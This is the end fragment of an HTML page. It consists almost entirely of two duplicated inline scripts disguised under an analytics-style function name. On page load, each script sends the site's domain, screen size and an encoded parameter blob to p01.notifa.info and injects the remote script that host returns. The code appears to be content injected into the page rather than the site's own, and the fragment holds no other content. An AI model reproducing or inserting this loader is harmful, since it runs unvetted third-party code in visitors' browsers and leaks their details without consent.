<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXQ71Sv0SwU6QmUj0UjMaVs0%2bGnd1Wx%2bNLpXQ9eGNFWNpIH1dXXgyc4obHywiLrNc1XzmpM7UOl6NSAZvEiwNE%2fs%2f0XX2Wshuna%2fSUfuBmmvJEp80%2bRKNVXl0qxk8yQcQPSOeunFeNbImOgFsUmdq%2bc2GY8QiJtvi1XTjCciLyrx43gJ0yb0KDMyK%2baMaF9XkyZqGaU0loVeQkE94utq0kvl1yejgCrbbvnmAD0fAMd8UFe9dDVtu6%2biYYR5QnNIp7zJYX6Xplp3EIfSBm9wYcC0mmhCnIZomKD9zyUHUg3SbrWoghMbKeJpnk0g028wuC0Hqxq2nCrWd%2fAMNL0GU9p%2f2YuhGzrd8kUOlzFLb3cOxHB44Gsp2%2bSqlNgoTDWDpWON%2fXmvG0tvjdgWAtTwrxVAXw8pKiP99eOQb4pEdvdc%2b8ivw0VEhpwvUsqDby9Ib3soBt4cK3XyxbYa9jECSNfPcMptHZpwJNvVkO8czc%2bZ3X%2fTHD%2f5ijBd9vV1RNk7aZK7icPz4dZgMmEc69u%2bcqU6X4aXT%2foVfCWEiWdT14Mfx3ZxTRwEbmUiRU7AWdLSmN8SA0CJoWSbw%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX%2b59GJXJM5o9ir8nqDO4ncFWHLlp59IDFYvNghi%2ftM%2fhSKTeCJv8MTEhX1f9lq1mfb18sFZuYfI3mgEaFCx3UrEMTGQUYQ6wfy5TLTP34HiJDeAkoDncD0RVXiqZ91pg6gIGnRHLTLGbV2%2fkC1eZR4JWIGlGMIsvEaJvPUrtppNz7HENExp7ZzmwHDa%2f5hW7P2ViBcoLQw%2fqSOUrOIBWzLKMlFLpnT%2bU9ipt67hQJaGoijdj9ZuDDYlSELyDQQDYy%2fPl2AN0acnu%2bbHUQakcTNPIIiVyMruUnUKsIF6mSuEBTHon7XljhLoXELAz%2fytfwC9bNwHh7lJD8xSqZHhLkPbGRMczdNhRTPf35bPGzgobTy2BR%2fEXFghrN9ovij63TXOpoCmIkkfhrshT8rsWhKi1wYVFByF2FpIIDpbD1%2fYMsjOS0w2sfhJFZfC9NoEN11JaDplJ%2fxBl0L1IaDuAX6xETfdngLMHRTepi63BfvQbfHF1QynpHreulkgvG47f4dMcD8nCck7iWFKa%2bvTruhItH1fJfOHuEmVnllTJXx0HqrWf9rRgvptm%2bWOB3B7bjhm6If6MP5iJCQdq3a%2bVA7w%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


</html>


